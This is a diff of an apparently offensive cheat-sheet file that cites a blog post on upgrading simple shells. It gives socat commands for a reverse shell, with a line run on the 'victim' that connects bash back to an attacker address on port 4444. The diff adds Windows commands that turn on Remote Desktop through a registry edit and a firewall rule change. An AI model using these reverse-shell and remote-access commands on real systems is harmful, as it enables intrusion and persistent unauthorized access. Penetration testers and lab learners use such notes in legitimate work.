@@ -1,4 +1,4 @@
-# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
 ### stty options
 # In reverse shell
@@ -19,3 +19,10 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+
+#### Enable RDP
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
